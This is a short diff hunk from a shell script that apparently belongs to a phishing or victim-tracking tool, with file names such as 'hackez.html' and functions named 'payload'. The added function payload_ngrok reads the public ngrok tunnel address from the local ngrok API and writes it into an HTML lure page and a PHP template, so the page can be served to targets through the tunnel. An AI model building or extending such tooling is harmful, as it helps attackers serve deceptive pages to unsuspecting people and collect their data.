@@ -237,6 +237,11 @@ fi
 
 
 }
+payload_ngrok() {
+    send_link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
+    sed 's+forwarding_link+'$send_link'+g' hackez.html > index2.html
+    sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+}
 
 
 payload() {
